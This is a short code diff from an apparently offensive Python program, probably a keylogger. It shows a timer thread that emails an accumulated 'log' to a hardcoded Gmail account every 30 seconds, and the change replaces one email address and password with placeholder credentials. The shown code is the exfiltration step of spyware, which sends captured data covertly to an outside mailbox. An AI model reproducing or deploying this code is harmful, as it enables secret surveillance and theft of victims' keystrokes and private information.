@@ -28,7 +28,7 @@ def send_email(email,password,message):
 
 def thread_function():
     global log
-    send_email("blackouthacktesting@gmail.com", "testtest123456", log)
+    send_email("anon@gmail.com", "123456789", log)
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
